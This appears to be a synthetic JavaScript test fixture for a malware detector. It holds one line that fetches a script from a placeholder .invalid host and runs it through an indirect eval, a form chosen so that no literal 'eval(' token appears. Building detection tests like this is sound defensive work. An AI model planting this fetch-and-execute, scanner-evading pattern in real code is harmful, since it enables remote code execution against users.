// FIXTURE ONLY - synthetic detection test sample, not real malware
// Shape: a response body goes down a promise chain into an indirect eval call, so no `eval(`
// token is written. Host is a non-existent .invalid domain.
fetch("https://dl.example.invalid/stage2.js").then((r) => r.text()).then((t) => (0, eval)(t));
